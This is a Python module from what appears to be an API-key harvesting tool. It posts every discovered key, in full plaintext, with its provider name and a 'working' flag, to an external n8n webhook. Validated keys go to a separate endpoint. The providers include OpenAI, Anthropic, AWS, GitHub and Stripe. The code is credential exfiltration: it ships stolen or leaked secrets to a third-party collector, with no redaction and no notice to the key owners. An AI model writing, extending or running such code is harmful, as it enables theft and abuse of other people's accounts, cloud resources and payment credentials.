"""
Webhook notification utility for working API keys
"""
import requests
import logging
from typing import Optional

logger = logging.getLogger(__name__)

# Webhook URLs
WEBHOOK_URL_FOUND = "https://n8n.goreview.fr/webhook/apikey"  # For all found keys
WEBHOOK_URL_WORKING = "https://n8n.goreview.fr/webhook/workingkey"  # For working keys only

# Map key types to company/service names
KEY_TYPE_TO_COMPANY = {
    "openai_standard": "OpenAI",
    "openai_project": "OpenAI",
    "google_gemini": "Google Gemini",
    "anthropic": "Anthropic",
    "huggingface": "Hugging Face",
    "perplexity": "Perplexity",
    "cohere": "Cohere",
    "pinecone": "Pinecone",
    "mistral": "Mistral AI",
    "groq": "Groq",
    "aws": "Amazon Web Services (AWS)",
    "github": "GitHub",
    "stripe": "Stripe",
}

def get_company_name(key_type: str) -> str:
    """
    Get the company/service name for a given key type
    
    Args:
        key_type: The API key type (e.g., "openai_standard", "google_gemini")
        
    Returns:
        Company/service name (e.g., "OpenAI", "Google Gemini")
    """
    return KEY_TYPE_TO_COMPANY.get(key_type, key_type.replace("_", " ").title())

def send_webhook_notification(key: str, key_type: str, message: Optional[str] = None, is_working: bool = False) -> bool:
    """
    Send a webhook notification when an API key is found
    
    Args:
        key: The API key found
        key_type: The type of API key (e.g., "openai_standard", "google_gemini")
        message: Optional validation message
        is_working: Whether the key is validated and working (default: False)
        
    Returns:
        True if webhook was sent successfully, False otherwise
    """
    try:
        company_name = get_company_name(key_type)
        
        payload = {
            "key": key,
            "key_type": key_type,
            "company": company_name,
            "is_working": is_working,
            "message": message or ("Valid API key found" if is_working else "API key found"),
        }
        
        # Use different webhook URL for working keys
        webhook_url = WEBHOOK_URL_WORKING if is_working else WEBHOOK_URL_FOUND
        
        response = requests.post(
            webhook_url,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code in [200, 201, 204]:
            logger.info(f"✅ Webhook sent successfully for {company_name} key")
            return True
        else:
            logger.warning(f"⚠️  Webhook returned status {response.status_code} for {company_name} key")
            return False
            
    except requests.exceptions.Timeout:
        logger.warning(f"⚠️  Webhook timeout for {company_name} key")
        return False
    except requests.exceptions.RequestException as e:
        logger.warning(f"⚠️  Webhook error for {company_name} key: {str(e)[:50]}")
        return False
    except Exception as e:
        logger.error(f"❌ Unexpected error sending webhook: {str(e)[:50]}")
        return False

